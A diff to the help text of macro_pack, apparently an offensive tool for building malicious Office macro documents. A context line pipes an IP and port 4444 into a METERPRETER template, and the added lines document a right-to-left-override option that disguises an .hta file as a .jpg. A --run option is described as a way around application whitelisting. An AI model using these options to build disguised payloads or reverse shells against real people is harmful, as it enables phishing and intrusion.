@@ -323,9 +323,13 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
          Note: This option requires Windows OS with genuine MS Office installed. 
     
     --run=FILE_PATH Open document using COM to run macro. Can be useful to bypass whitelisting situations.
-           This will trigger AutoOpen/Workbook_Open automatically. 
-           If no auto start function, use --start-function option to indicate which macro to run. 
-           This option is only compatible with Ms Office formats.
+        This will trigger AutoOpen/Workbook_Open automatically. 
+        If no auto start function, use --start-function option to indicate which macro to run. 
+        This option is only compatible with Ms Office formats.
+           
+     --unicode-rtlo=SPOOF_EXTENSION Inject the unicode U+202E char (Right-To-Left Override) to spoof the file extension when view in explorers.
+        Ex. To generate an hta file with spoofed jpg extension use options: -G something.hta --unicode-rtlo=jpg
+        In this case, windows or linux explorers will show the file named as: somethingath.jpg 
 
     -h, --help   Displays help and exit
            
